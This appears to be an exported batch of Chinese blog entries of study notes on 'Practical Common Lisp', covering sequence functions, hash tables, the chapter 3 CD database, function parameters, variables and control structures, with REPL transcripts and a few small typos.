<h2 id="向量的子类型"><a href="#向量的子类型" class="headerlink" title="向量的子类型"></a>向量的子类型</h2><p>字符串<code>“foo&quot;</code>和<code>#()</code>写成的字面向量一样，大小固定不可修改。</p>
<p>创建变长字符串：</p>
<pre><code>CL-USER&gt; (make-array 5 :fill-pointer 0 :adjustable t :element-type &#39;character)
&quot;&quot;
</code></pre>
<p>创建位向量：</p>
<pre><code>CL-USER&gt; (make-array 5 :fill-pointer 0 :adjustable t :element-type &#39;bit)
#*
</code></pre>
<h2 id="序列操作"><a href="#序列操作" class="headerlink" title="序列操作"></a>序列操作</h2><pre><code>CL-USER&gt; (defparameter *x* (vector 1 2 3))
*X*
CL-USER&gt; (length *x*)
3
CL-USER&gt; (elt *x* 0)
1
CL-USER&gt; (elt *x* 1)
2
CL-USER&gt; (elt *x* 2)
3
CL-USER&gt; (elt *x* 3)
Invoking restart: Kill this thread
; Evaluation aborted on #&lt;CCL::SEQUENCE-INDEX-TYPE-ERROR #x21008241DD&gt;.
CL-USER&gt; (setf (elt *x* 0) 10)
10
CL-USER&gt; *x*
#(10 2 3)
CL-USER&gt; 
</code></pre>
<h2 id="序列迭代函数"><a href="#序列迭代函数" class="headerlink" title="序列迭代函数"></a>序列迭代函数</h2><p>理论上所有的序列操作都可以归纳于length、elt、setf操作。</p>
<p>序列函数允许不用显示遍历列表就可以表达一定的序列操作。</p>
<pre><code>CL-USER&gt; (count 1 #(1 2 3 4 1 2 3))
2
CL-USER&gt; (remove 1 #(1 2 3 4 1 2 3))
#(2 3 4 2 3)
CL-USER&gt; (remove 1 &#39;(1 2 3 4 1 2 3))
(2 3 4 2 3)
CL-USER&gt; (remove #\a &quot;ababcdeft&quot;)
&quot;bbcdeft&quot;
CL-USER&gt; (substitute 10 1 #(1 2 1 2))
#(10 2 10 2)
CL-USER&gt; (substitute 10 1 &#39;(1 2 1 2))
(10 2 10 2)
CL-USER&gt; (substitute #\b #\a &quot;abcabc&quot;)
&quot;bbcbbc&quot;
CL-USER&gt; (find 3 #(1 2 3 4))
3
CL-USER&gt; (find 5 #(1 2 3 4))
NIL
CL-USER&gt; (position 2 #(1 1 1 2 3 ))
3
CL-USER&gt; 
</code></pre>
<p>关键字参数：</p>
<p>:test 两参数函数用于比较元素和项</p>
<p>:key 单参数函数用于从实际序列元素中解出用于比较的关键字</p>
<p>:start 子序列的起始索引</p>
<p>:end 子序列的结束索引</p>
<p>:from-end 如果为真以相反顺序遍历</p>
<p>:count 需要移除或替换的元素个数</p>
<pre><code>CL-USER&gt; (defparameter *v* #((a 10) (b 20) (a 30) (b 40)))
*V*
CL-USER&gt; (defun verbose-first (x) (format t &quot;looking at ~s~%&quot; x) (first x))
VERBOSE-FIRST
CL-USER&gt; (count &#39;a *v* :key #&#39;verbose-first)
looking at (A 10)
looking at (B 20)
looking at (A 30)
looking at (B 40)
2
CL-USER&gt; (count &#39;a *v* :key #&#39;verbose-first :from-end t)
looking at (B 40)
looking at (A 30)
looking at (B 20)
looking at (A 10)
2
CL-USER&gt; 
</code></pre>
<h2 id="高阶函数变体"><a href="#高阶函数变体" class="headerlink" title="高阶函数变体"></a>高阶函数变体</h2><p>对于每个序列迭代函数都有两种高阶函数变体，它们接受一个将在每个序列元素上调用的函数，以此来代替项参数。</p>
<p>第一类追加-IF，第二类追加-IF-NOT。</p>
<pre><code>CL-USER&gt; (count-if #&#39;evenp #((1 a) (2 b) (3 c) (4 d) (5 e)) :key #&#39;first)
2
CL-USER&gt; (count-if-not #&#39;evenp #((1 a) (2 b) (3 c) (4 d) (5 e)) :key #&#39;first)
3
CL-USER&gt; (remove-if-not #&#39;alpha-char-p #(&quot;foo&quot; &quot;bar&quot; &quot;1baz&quot;) :key #&#39;(lambda (x) (elt x 0)))
#(&quot;foo&quot; &quot;bar&quot;)
CL-USER&gt; (remove-duplicates #(1 2 1 2 3 1 2 3 4))
#(1 2 3 4)
CL-USER&gt; 
</code></pre>
<h2 id="排序与合并"><a href="#排序与合并" class="headerlink" title="排序与合并"></a>排序与合并</h2><pre><code>CL-USER&gt; (sort #(&quot;foo&quot; &quot;bar&quot; &quot;baz&quot;) #&#39;string&lt;)
\#(&quot;bar&quot; &quot;baz&quot; &quot;foo&quot;)
CL-USER&gt; (merge &#39;vector #(1 3 5) #(2 3 4) #&#39;&lt;)
\#(1 2 3 3 4 5)
CL-USER&gt;
</code></pre>
<h2 id="子序列操作"><a href="#子序列操作" class="headerlink" title="子序列操作"></a>子序列操作</h2><p>subseq取子序列，支持setf。</p>
<pre><code>CL-USER&gt; (subseq &quot;foobarbaz&quot; 3)
&quot;barbaz&quot;
CL-USER&gt; (subseq &quot;foobarbaz&quot; 3 6)
&quot;bar&quot;
CL-USER&gt; (defparameter *x* (copy-seq &quot;foobarbaz&quot;))
*X*
CL-USER&gt; (setf (subseq *x* 3 6) &quot;xxx&quot;)
&quot;xxx&quot;
CL-USER&gt; *x*
&quot;fooxxxbaz&quot;
CL-USER&gt; (setf (subseq *x* 3 6) &quot;abcd&quot;)
&quot;abcd&quot;
CL-USER&gt; *x*
&quot;fooabcbaz&quot;
CL-USER&gt; (setf (subseq *x* 3 6) &quot;xx&quot;)
&quot;xx&quot;
CL-USER&gt; *x*
&quot;fooxxcbaz&quot;
CL-USER&gt; 
</code></pre>
<p>匹配串：</p>
<pre><code>CL-USER&gt; (position #\b &quot;foobarbaz&quot;)
3
CL-USER&gt; (search &quot;bar&quot; &quot;foobarbaz&quot;)
3
CL-USER&gt; (mismatch &quot;foobarbaz&quot; &quot;foom&quot;)
3
CL-USER&gt; 
</code></pre>
<h2 id="序列谓词"><a href="#序列谓词" class="headerlink" title="序列谓词"></a>序列谓词</h2><p>EVERY:每个都满足为真</p>
<p>SOME:有一个满足为真</p>
<p>NOTANY:从未满足返回真</p>
<p>NOTEVERY:总是满足返回假</p>
<pre><code>CL-USER&gt; (every #&#39;evenp #(1 2 3 4 5))
NIL
CL-USER&gt; (some #&#39;evenp #(1 2 3 4 5))
T
CL-USER&gt; (notany #&#39;evenp #(1 2 3 4 5))
NIL
CL-USER&gt; (notevery #&#39;evenp #(1 2 3 4 5))
T
CL-USER&gt; (every #&#39;&gt; #(1 2 3 4) #(5 4 3 2))
NIL
CL-USER&gt; (some #&#39;&gt; #(1 2 3 4) #(5 4 3 2))
T
CL-USER&gt; (notany #&#39;&gt; #(1 2 3 4) #(5 4 3 2))
NIL
CL-USER&gt; (notevery #&#39;&gt; #(1 2 3 4) #(5 4 3 2))
T
CL-USER&gt; 
</code></pre>
<h2 id="序列映射函数"><a href="#序列映射函数" class="headerlink" title="序列映射函数"></a>序列映射函数</h2><pre><code>CL-USER&gt; (map &#39;vector #&#39;* #(1 2 3 4 5) #(10 9 8 7 6))
#(10 18 24 28 30)
CL-USER&gt; (reduce #&#39;+ #(1 2 3 4 5 6 7 8 9 10))
55
CL-USER&gt; 
</code></pre>
<p>reduce可以接收的关键字参数:</p>
<p>:key</p>
<p>:from-end</p>
<p>:start</p>
<p>:end</p>
<p>:intial-value</p>
<h2 id="哈希表"><a href="#哈希表" class="headerlink" title="哈希表"></a>哈希表</h2><p>make-hash-table:创建哈希表</p>
<p>gethash:取值</p>
<p>setf:设置</p>
<p>remhash:移除</p>
<p>clrhash:清空</p>
<p>maphash:迭代</p>
<pre><code>CL-USER&gt; (defparameter *h* (make-hash-table))
*H*
CL-USER&gt; (gethash &#39;foo *h*)
NIL
NIL
CL-USER&gt; (setf (gethash &#39;foo *h*) &#39;quux)
QUUX
CL-USER&gt; (gethash &#39;foo *h*)
QUUX
T
CL-USER&gt; 
CL-USER&gt; (maphash #&#39;(lambda (k v) (format t &quot;~a =&gt; ~a~%&quot; k v )) *h*)
FOO =&gt; QUUX
NIL
CL-USER&gt; 
</code></pre>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>Lisp</category>
        <category>Common Lisp</category>
      </categories>
      <tags>
        <tag>Common Lisp</tag>
      </tags>
  </entry>
  <entry>
    <title>第3章简单的数据库-实用Common Lisp编程笔记</title>
    <url>/blog/plang/lisp/pcldiary/chapter3/</url>
    <content><![CDATA[<h3 id="属性表"><a href="#属性表" class="headerlink" title="属性表"></a>属性表</h3><pre><code>CL-USER&gt; (getf (list :a 1 :b 2 :c 3) :a)
1
</code></pre>
<h3 id="make-cd"><a href="#make-cd" class="headerlink" title="make-cd"></a>make-cd</h3><pre><code> (defun make-cd (title artist rating ripped)
    (list :tilte title :artist artist :rating rating :ripped ripped))
</code></pre>
<h3 id="DEFVAR"><a href="#DEFVAR" class="headerlink" title="DEFVAR"></a>DEFVAR</h3><p>定义全局变量</p>
<pre><code>(defvar *db* nil)
</code></pre>
<h3 id="add-record"><a href="#add-record" class="headerlink" title="add-record"></a>add-record</h3><pre><code>(defun add-record (cd) (push cd *db*))
</code></pre>
<h3 id="录入"><a href="#录入" class="headerlink" title="录入"></a>录入</h3><pre><code>CL-USER&gt; (add-record (make-cd &quot;roses&quot; &quot;kathy&quot; 7 t))
((:TILTE &quot;roses&quot; :ARTIST &quot;kathy&quot; :RATING 7 :RIPPED T))
CL-USER&gt; (add-record (make-cd &quot;roses2&quot; &quot;kathy2&quot; 8 t))
((:TILTE &quot;roses2&quot; :ARTIST &quot;kathy2&quot; :RATING 8 :RIPPED T)
(:TILTE &quot;roses&quot; :ARTIST &quot;kathy&quot; :RATING 7 :RIPPED T))
CL-USER&gt; (add-record (make-cd &quot;roses3&quot; &quot;kathy3&quot; 9 t))
((:TILTE &quot;roses3&quot; :ARTIST &quot;kathy3&quot; :RATING 9 :RIPPED T)
(:TILTE &quot;roses2&quot; :ARTIST &quot;kathy2&quot; :RATING 8 :RIPPED T)
(:TILTE &quot;roses&quot; :ARTIST &quot;kathy&quot; :RATING 7 :RIPPED T))
CL-USER&gt; 
</code></pre>
<h3 id="查看"><a href="#查看" class="headerlink" title="查看"></a>查看</h3><pre><code>CL-USER&gt; *db*
((:TILTE &quot;roses3&quot; :ARTIST &quot;kathy3&quot; :RATING 9 :RIPPED T)
(:TILTE &quot;roses2&quot; :ARTIST &quot;kathy2&quot; :RATING 8 :RIPPED T)
(:TILTE &quot;roses&quot; :ARTIST &quot;kathy&quot; :RATING 7 :RIPPED T))
CL-USER&gt; 
</code></pre>
<h3 id="dump-db"><a href="#dump-db" class="headerlink" title="dump-db"></a>dump-db</h3><pre><code>(defun dump-db()
    (dolist (cd *db*)
        (format t &quot;~&#123;~a: ~10t~a~%~&#125;~%&quot; cd)))
</code></pre>
<p>format</p>
<pre><code>~a: ~10t~a~%~
</code></pre>
<p>处理一个键值对。</p>
<pre><code>~&#123;~a: ~10t~a~%~&#125;
</code></pre>
<p>循环处理列表所有键值对。</p>
<pre><code>(defun dump-db ()
    (format t &quot;~&#123;~&#123;~a: ~10t~a~%~&#125;~%~&#125;&quot; *db*))
</code></pre>
<h3 id="format"><a href="#format" class="headerlink" title="format"></a>format</h3><pre><code>~a
</code></pre>
<p>美化，关键字没有前导冒号，字段串没有双引号。</p>
<pre><code>~10t
</code></pre>
<p>输出制表符。</p>
<pre><code>~&#123;~&#125;
</code></pre>
<p>列表处理部分。</p>
<pre><code>~%
</code></pre>
<p>换行。</p>
<h3 id="交互读取"><a href="#交互读取" class="headerlink" title="交互读取"></a>交互读取</h3><pre><code>(defun prompt-read (prompt)
    (format *query-io* &quot;~a: &quot; prompt)
    (force-output *query-io*)
    (read-line *query-io*))
</code></pre>
<p><em>query-io</em></p>
<p>当前终端输入流的全局变量。</p>
<pre><code>(defun prompt-for-cd () 
    (make-cd 
        (prompt-read &quot;title&quot;)
        (prompt-read &quot;artist&quot;)
        (prompt-read &quot;rating&quot;)
        (prompt-read &quot;ripped [y/n]&quot;)))
         
(defun prompt-for-cd () 
    (make-cd 
        (prompt-read &quot;title&quot;)
        (prompt-read &quot;artist&quot;)
        (or (parse-integer (prompt-read &quot;rating&quot;) :junk-allowed t) 0)
        (y-or-n-p &quot;ripped [y/n]&quot;)))

(defun add-cds ()
   (loop (add-record (prompt-for-cd))
      (if (not (y-or-n-p &quot;another? [y/n]: &quot;)) (return))))     
</code></pre>
<h3 id="保存和加载数据库"><a href="#保存和加载数据库" class="headerlink" title="保存和加载数据库"></a>保存和加载数据库</h3><pre><code>(defun save-db (filename)
  (with-open-file (out filename
               :direction :output
               :if-exists :supersede)
    (with-standard-io-syntax
      (print *db* out))))
</code></pre>
<p>:direction :output</p>
<p>用于写入的文件。</p>
<p>:if-exists :supersede</p>
<p>覆盖已经存在的文件。</p>
<pre><code>(defun load-db (filename)
  (with-open-file (in filename)
    (with-standard-io-syntax
      (setf *db* (read in)))))
</code></pre>
<h3 id="remove-if-not"><a href="#remove-if-not" class="headerlink" title="remove-if-not"></a>remove-if-not</h3><pre><code>CL-USER&gt; (remove-if-not #&#39;evenp &#39;(1 2 3 4 5 6 7 8 9 10))
(2 4 6 8 10)
</code></pre>
<p>​<br>​    CL-USER&gt; (remove-if-not #’(lambda (x) (&#x3D; 0 (mod x 2)))<br>​    		‘(1 2 3 4 5 6 7 8 9 10))<br>​    (2 4 6 8 10)</p>
<h3 id="查询数据库"><a href="#查询数据库" class="headerlink" title="查询数据库"></a>查询数据库</h3><pre><code>(defun select (select-fn)
    (remove-if-not select-fn *db*))
  
(defun select-by-artist (artist)
  (remove-if-not
   #&#39;(lambda (cd) (equal (getf cd :artist) artist))
   *db*))
   
(defun artist-selector (artist)
    #&#39;(lambda (cd) (equal (getf cd :artist) artist)))
</code></pre>
<h3 id="where"><a href="#where" class="headerlink" title="where"></a>where</h3><pre><code>(defun where (&amp;key title artist rating (ripped nil ripped-p))
  #&#39;(lambda (cd)
      (and
       (if title (equal (getf cd :title) title) t)
       (if artist (equal (getf cd :artist) artist) t)
       (if rating (equal (getf cd :rating) rating) t)
       (if ripped-p (equal (getf cd :ripped) ripped) t))))
</code></pre>
<h3 id="update"><a href="#update" class="headerlink" title="update"></a>update</h3><pre><code>(defun update (selector-fn &amp;key title artist rating (ripped nil ripped-p))
  (setf *db*
    (mapcar
     #&#39;(lambda (row)
         (when (funcall selector-fn row)
           (if title (setf (getf row :title) title))
           (if artist (setf (getf row :artist) artist))
           (if rating (setf (getf row :rating) rating))
           (if ripped-p (setf (getf row :ripped) ripped)))
         row) *db*)))
</code></pre>
<h3 id="macro"><a href="#macro" class="headerlink" title="macro"></a>macro</h3><pre><code>CL-USER&gt; (defun make-comparison-expr (field value)
       (list &#39;equal (list &#39;getf &#39;cd field) value))
MAKE-COMPARISON-EXPR
CL-USER&gt; (make-comparison-expr :rating 10)
(EQUAL (GETF CD :RATING) 10)
</code></pre>
<p>反引号</p>
<p>任何以逗号开始的子句会被求值</p>
<pre><code>CL-USER&gt; `(1 2 (+ 1 2))
(1 2 (+ 1 2))
CL-USER&gt; `(1 2 ,(+ 1 2))
(1 2 3)
CL-USER&gt; 
</code></pre>
<p>where宏</p>
<pre><code>(defun make-comparison-expr (field value)
    `(equal (getf cd ,field) ,value))

(defun make-comparisons-list (fields)
    (loop while fields
        collecting (make-comparison-expr (pop fields) (pop fields))))
          
(defmacro where (&amp;rest clauses)
    `#&#39;(lambda (cd) (and ,@(make-comparisons-list clauses))))
</code></pre>
<h3 id=""><a href="#" class="headerlink" title=",@"></a>,@</h3><pre><code>CL-USER&gt; `(and ,(list 1 2 3))
(AND (1 2 3))
CL-USER&gt; `(and ,@(list 1 2 3))
(AND 1 2 3)
</code></pre>
<h3 id="macroexpand-1"><a href="#macroexpand-1" class="headerlink" title="macroexpand-1"></a>macroexpand-1</h3><pre><code>CL-USER&gt; (macroexpand-1 &#39;(where :title &quot;adafdsf&quot; :ripped t))
#&#39;(LAMBDA (CD) (AND (EQUAL (GETF CD :TITLE) &quot;adafdsf&quot;) (EQUAL (GETF CD :RIPPED) T)))
T
</code></pre>
<p>​           </p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>Lisp</category>
        <category>Common Lisp</category>
      </categories>
      <tags>
        <tag>Common Lisp</tag>
      </tags>
  </entry>
  <entry>
    <title>第5章函数-实用Common Lisp编程笔记</title>
    <url>/blog/plang/lisp/pcldiary/chapter5/</url>
    <content><![CDATA[<h2 id="可选形参-amp-optional"><a href="#可选形参-amp-optional" class="headerlink" title="可选形参 &amp;optional"></a>可选形参 &amp;optional</h2><pre><code>CL-USER&gt; (defun foo (a b &amp;optional c d) (list a b c d))
FOO
CL-USER&gt; (foo 1 2)
(1 2 NIL NIL)
CL-USER&gt; (foo 1 2 3)
(1 2 3 NIL)
CL-USER&gt; (foo 1 2 3 4)
(1 2 3 4)
CL-USER&gt; 
</code></pre>
<p>带参数的可选形参</p>
<pre><code>CL-USER&gt; (foo 1 2)
(1 2)
CL-USER&gt; (foo 1)
(1 10)
</code></pre>
<p>带调用标识的可选形参</p>
<pre><code>CL-USER&gt; (defun foo (a b &amp;optional (c 3 c_supplied-p)) (list a b c c_supplied-p))
FOO
CL-USER&gt; (foo 1 2)
(1 2 3 NIL)
CL-USER&gt; (foo 1 2 3)
(1 2 3 T)
CL-USER&gt; (foo 1 2 4)
(1 2 4 T)
CL-USER&gt; 
</code></pre>
<h2 id="剩余形参-amp-rest"><a href="#剩余形参-amp-rest" class="headerlink" title="剩余形参 &amp;rest"></a>剩余形参 &amp;rest</h2><pre><code>CL-USER&gt; (defun add (&amp;rest numbers) (format t &quot;~a&quot; numbers))
ADD
CL-USER&gt; (add 1 2 3)
(1 2 3)
NIL
</code></pre>
<h2 id="关键字形参-amp-key"><a href="#关键字形参-amp-key" class="headerlink" title="关键字形参 &amp;key"></a>关键字形参 &amp;key</h2><pre><code>CL-USER&gt; (defun foo (&amp;key a b c)(list a b c))
FOO
CL-USER&gt; (foo)
(NIL NIL NIL)
CL-USER&gt; (foo :a 1)
(1 NIL NIL)
CL-USER&gt; (foo :b 1)
(NIL 1 NIL)
CL-USER&gt; (foo :c 1)
(NIL NIL 1)
CL-USER&gt; (foo :a 1 :c 3)
(1 NIL 3)
CL-USER&gt; (foo :c 3 :b 2 :a 1)
(1 2 3)
CL-USER&gt; 
</code></pre>
<p>带标识的关键字参数</p>
<pre><code>CL-USER&gt; (defun foo (&amp;key (a 0) (b 0 b-supplied-p)(c (+ a b)))
       (list a b c b-supplied-p))
FOO
CL-USER&gt; (foo )
(0 0 0 NIL)
CL-USER&gt; (foo :a 1 :b 2)
(1 2 3 T)
</code></pre>
<p>改变关键字</p>
<pre><code>CL-USER&gt; (defun foo (&amp;key ((:apple a)) ((:box b) 0) ((:charlie c) 0 c-supplied-p))
       (list a b c c-supplied-p))
FOO
CL-USER&gt; (foo :apple 10 :box 20 :charlie 30)
(10 20 30 T)
</code></pre>
<h2 id="组合"><a href="#组合" class="headerlink" title="组合"></a>组合</h2><p>&amp;optional &amp;key</p>
<p>&amp;rest &amp;key</p>
<p>这两种组合会产生奇怪行为。</p>
<p>当&amp;optiona不足时会吞掉&amp;key的key和value。</p>
<p>&amp;rest会收集&amp;key的key和value。</p>
<pre><code>CL-USER&gt; (defun foo (&amp;rest rest &amp;key a b c)(list rest a b c))
FOO
CL-USER&gt; (foo :a 1 :b 2 :c 3)
((:A 1 :B 2 :C 3) 1 2 3)
CL-USER&gt; #&#39;foo
#&lt;Compiled-function FOO #x2100910C5F&gt;
CL-USER&gt; 
</code></pre>
<h2 id="return-from"><a href="#return-from" class="headerlink" title="return-from"></a>return-from</h2><h2 id="高阶函数"><a href="#高阶函数" class="headerlink" title="高阶函数"></a>高阶函数</h2><h3 id="操作符FUNCTION"><a href="#操作符FUNCTION" class="headerlink" title="操作符FUNCTION"></a>操作符FUNCTION</h3><p>用来获取函数对象，语法糖为#‘</p>
<pre><code>CL-USER&gt; (defun foo () ())
FOO
CL-USER&gt; (function foo)
#&lt;Compiled-function FOO #x2100910C5F&gt;
CL-USER&gt; 
</code></pre>
<h3 id="调用函数对象"><a href="#调用函数对象" class="headerlink" title="调用函数对象"></a>调用函数对象</h3><p>funcall</p>
<pre><code>(foo 1 2 3)
(funcall #&#39;foo 1 2 3)
</code></pre>
<p>一个例子</p>
<pre><code>CL-USER&gt; (defun plot (fn min max step)
       (loop for i from min to max by step do
        (loop repeat (funcall fn i) do (format t &quot;*&quot;))
        (format t &quot;~%&quot;)))
PLOT
CL-USER&gt; (plot #&#39;exp 0 4 1/2)
*
*
**
****
*******
************
********************
*********************************
******************************************************
NIL
CL-USER&gt; 
</code></pre>
<p>apply</p>
<p>接收一个列表为函数参数</p>
<pre><code>CL-USER&gt; (defun foo (a b c) (list a b c))
FOO
CL-USER&gt; (apply #&#39;foo &#39;(1 2 3))
(1 2 3)
CL-USER&gt; (apply #&#39;foo 1 2 3 ())
(1 2 3)
CL-USER&gt; (apply #&#39;foo 1 2 &#39;(3))
(1 2 3)
</code></pre>
<h2 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h2><p>CL-USER&gt; (plot #’(lambda (x) (* 2 x)) 0 10 1)</p>
<pre><code>**
****
******
********
**********
************
**************
****************
******************
********************
NIL
CL-USER&gt; 
</code></pre>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>Lisp</category>
        <category>Common Lisp</category>
      </categories>
      <tags>
        <tag>Common Lisp</tag>
      </tags>
  </entry>
  <entry>
    <title>第6章变量-实用Common Lisp编程笔记</title>
    <url>/blog/plang/lisp/pcldiary/chapter6/</url>
    <content><![CDATA[<h2 id="let"><a href="#let" class="headerlink" title="let"></a>let</h2><p>绑定的变量只能在body-form中生效。</p>
<pre><code>(let (variable*)
    body-form*)

(let ((x 10) (y 20) z)
    ...)
</code></pre>
<p>示例：</p>
<pre><code>CL-USER&gt; (defun foo (x)
       (format t &quot;Parameter: ~a~%&quot; x)
       (let ((x 2))
         (format t &quot;Outer LET: ~a~%&quot; x)
         (let ((x 3))
           (format t &quot;Inner LET: ~a~%&quot; x))
         (format t &quot;Outer LET: ~a~%&quot; x))
      (format t &quot;Parameter: ~a~%&quot; x)) 
FOO
CL-USER&gt; (foo 1)
Parameter: 1
Outer LET: 2
Inner LET: 3
Outer LET: 2
Parameter: 1
NIL
CL-USER&gt; 
</code></pre>
<h2 id="let-1"><a href="#let-1" class="headerlink" title="let*"></a>let*</h2><p>每个变量的初始值都可以引用变量列表中早先引入的变量。</p>
<pre><code>CL-USER&gt; (let* ((x 10)
        (y (+ x 10)))
       (list x y ))
(10 20)
CL-USER&gt; 
</code></pre>
<h2 id="词法变量和闭包"><a href="#词法变量和闭包" class="headerlink" title="词法变量和闭包"></a>词法变量和闭包</h2><p>词法变量一般在退出绑定代码块后会被释放，但如果被匿名函数携带返回，则不会被释放。</p>
<pre><code>CL-USER&gt; (defparameter *fn* (let ((count 0))
    #&#39;(lambda () (setf count (1+ count)))))
*FN*
CL-USER&gt; (funcall *fn*)
1
CL-USER&gt; (funcall *fn*)
2
CL-USER&gt; (funcall *fn*)
3
CL-USER&gt; 
</code></pre>
<h2 id="动态变量（全局变量）"><a href="#动态变量（全局变量）" class="headerlink" title="动态变量（全局变量）"></a>动态变量（全局变量）</h2><p>全局变量命名：<br>defvar和defparameter</p>
<p>defparameter总是将值赋给变量。</p>
<p>defvar只有当变量未定义时才有效。</p>
<pre><code>CL-USER&gt; (defvar *count* 10)
*COUNT*
CL-USER&gt; *COUNT*
10
CL-USER&gt; (defvar *count* 11)
*COUNT*
CL-USER&gt; *COUNT*
10
CL-USER&gt; (defparameter *count* 11)
*COUNT*
CL-USER&gt; *COUNT*
11
CL-USER&gt; 
</code></pre>
<p>函数参数和LET</p>
<p>示例1：</p>
<pre><code>CL-USER&gt; (defparameter *count* 10)
*COUNT*
CL-USER&gt; *COUNT*
10
CL-USER&gt; (defun foo (*count*)
       (format t &quot;~a~%&quot; *count*)
       (setf *count* (+ 1 *count*))
       (format t &quot;~a~%&quot; *count*)
       (let ((*count* 100))
         (format t &quot;~a~%&quot; *count*)
         (setf *count* (+ 1 *count*))
         (format t &quot;~a~%&quot; *count*))
       (format t &quot;~a~%&quot; *count*))
          
FOO
CL-USER&gt; (foo *count*)
10
11
100
101
11
NIL
CL-USER&gt; *COUNT*
10
</code></pre>
<p>示例2：</p>
<pre><code>CL-USER&gt; *COUNT*
10
CL-USER&gt; (defun foo ()
       (format t &quot;~a~%&quot; *count*)
       (setf *count* (+ 1 *count*))
       (format t &quot;~a~%&quot; *count*)
       (let ((*count* 100))
         (format t &quot;~a~%&quot; *count*)
         (setf *count* (+ 1 *count*))
         (format t &quot;~a~%&quot; *count*))
       (format t &quot;~a~%&quot; *count*))
          
FOO
CL-USER&gt; (foo)
10
11
100
101
11
NIL
CL-USER&gt; *COUNT*
11
CL-USER&gt; 
</code></pre>
<p>闭包与动态变量</p>
<pre><code>CL-USER&gt; *COUNT*
11
CL-USER&gt; (defparameter *fn* (let ((*count* 0))
    #&#39;(lambda () (setf *count* (1+ *count*)))))
*FN*
CL-USER&gt; (funcall *fn*)
12
CL-USER&gt; (funcall *fn*)
13
CL-USER&gt;
</code></pre>
<h2 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h2><p>defconstant</p>
<h2 id="赋值"><a href="#赋值" class="headerlink" title="赋值"></a>赋值</h2><pre><code>(setf place value)
</code></pre>
<p>setf是宏，可以检查所赋值place上的形式，并展开成适当的低层操作修改那个位置。当位置是变量时，它展开成对SETQ的调用。</p>
<p>SETF一次也可以对多个位置赋值：</p>
<pre><code>(setf x 1 y 2)
</code></pre>
<p>setf返回最近被赋予的值，将x和y赋予同一个随机值：</p>
<pre><code>(setf x (setf y (random 10)))
</code></pre>
<h2 id="广义赋值"><a href="#广义赋值" class="headerlink" title="广义赋值"></a>广义赋值</h2><p>对各种结构赋值为10</p>
<pre><code>(setf x 10) 
(setf (aref a 0) 10) ;array
(setf (gethash &#39;key hash) 10) ;hash table
(setf (field o) 10) ;slot named &#39;field&#39;
</code></pre>
<h2 id="其它修改位置的方式"><a href="#其它修改位置的方式" class="headerlink" title="其它修改位置的方式"></a>其它修改位置的方式</h2><pre><code>(incf x) 
(setf x (+ x 1))
(decf x)
(setf x (- x 1))
(incf x 10)
(setf x (+ x 10))
</code></pre>
<p>一个例子：</p>
<pre><code>(incf (aref *array* (random (length *array*))))

(let ((tmp (ramdom (length *array*))))
    (setf (aref *array* tmp) (1+ (aref *array* tmp))))
</code></pre>
<p>rotatef</p>
<pre><code>(rotatef a b)
(let ((tmp a)) (setf a b b tmp) nil)
</code></pre>
<p>shiftf</p>
<pre><code>(shiftf a b 10)
(let ((tmp a)) (setf a b b 10) tmp)
</code></pre>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>Lisp</category>
        <category>Common Lisp</category>
      </categories>
      <tags>
        <tag>Common Lisp</tag>
      </tags>
  </entry>
  <entry>
    <title>第7章标准控制结构-实用Common Lisp编程笔记</title>
    <url>/blog/plang/lisp/pcldiary/chapter7/</url>
    <content><![CDATA[<h2 id="if"><a href="#if" class="headerlink" title="if"></a>if</h2><pre><code>(if condtion then-form [else-form])
</code></pre>
<p>then-form和else-form只能是单一lisp表达式。</p>
<p>示例：</p>
<pre><code>CL-USER&gt; (if (&gt; 2 3) &quot;then-form&quot; &quot;else-form&quot;)
&quot;else-form&quot;
CL-USER&gt; (if (&gt; 2 3) &quot;then-form&quot;)
NIL
CL-USER&gt; (if (&gt; 3 2) &quot;then-form&quot; &quot;else-form&quot;)
&quot;then-form&quot;
CL-USER&gt;
</code></pre>
<h2 id="progn"><a href="#progn" class="headerlink" title="progn"></a>progn</h2><p>顺序执行任意数量的宏，返回最后一个形式的值。</p>
<pre><code>(when (判断条件)
  (语句1)
  (语句2))

CL-USER&gt; (when T &quot;a&quot; &quot;b&quot;)
&quot;b&quot;
CL-USER&gt; (when NIL &quot;a&quot; &quot;b&quot;)
NIL
</code></pre>
<h2 id="WHEN宏"><a href="#WHEN宏" class="headerlink" title="WHEN宏"></a>WHEN宏</h2><pre><code>(defmacro when (condtion &amp;rest body)
    `(if ,condtion (progn ,@body)))
</code></pre>
<h2 id="UNLESS宏"><a href="#UNLESS宏" class="headerlink" title="UNLESS宏"></a>UNLESS宏</h2><pre><code>(defmacro when (condtion &amp;rest body)
    `(if （not ,condtion) (progn ,@body)))
    
    
</code></pre>
<h2 id="COND宏"><a href="#COND宏" class="headerlink" title="COND宏"></a>COND宏</h2><pre><code>(cond 
    (test-1 form*)
    ...
    (test-n form*))

CL-USER&gt; (COND (t &quot;a&quot; &quot;b&quot;)
           (t &quot;c&quot; &quot;d&quot;))
&quot;b&quot;
</code></pre>
<h2 id="AND-OR-NOT"><a href="#AND-OR-NOT" class="headerlink" title="AND OR NOT"></a>AND OR NOT</h2><pre><code>CL-USER&gt; (not nil)
T
CL-USER&gt; (not t)
NIL
CL-USER&gt; (and t nil)
NIL
CL-USER&gt; (or t nil)
T
</code></pre>
<h2 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h2><p>lisp的25个操作符没有循环结构，所有循环结构都是基于TAGBODY和GO操作符上的宏。</p>
<p>低层是一个强大的DO宏，dolist和dotimes是基于DO宏上的简便宏。</p>
<p>非LISP语法的LOOP宏，类Algol语言。</p>
<h2 id="dolist"><a href="#dolist" class="headerlink" title="dolist"></a>dolist</h2><pre><code>(dolist (var list-form)
    body-form*)
    
CL-USER&gt; (dolist (x &#39;(1 2 3)) (print x))

1 
2 
3 
NIL
</code></pre>
<p>中断循环</p>
<p>CL-USER&gt; (dolist (x ‘(1 2 3)) (print x) (if (evenp x) (return)))</p>
<p>1<br>2<br>NIL</p>
<h2 id="dotimes"><a href="#dotimes" class="headerlink" title="dotimes"></a>dotimes</h2><pre><code>(dotimes (var count-form)
    body-form*)
    
CL-USER&gt; (dotimes (n 5)(print n) (prin1 (* n n)))

0 0
1 1
2 4
3 9
4 16
NIL
</code></pre>
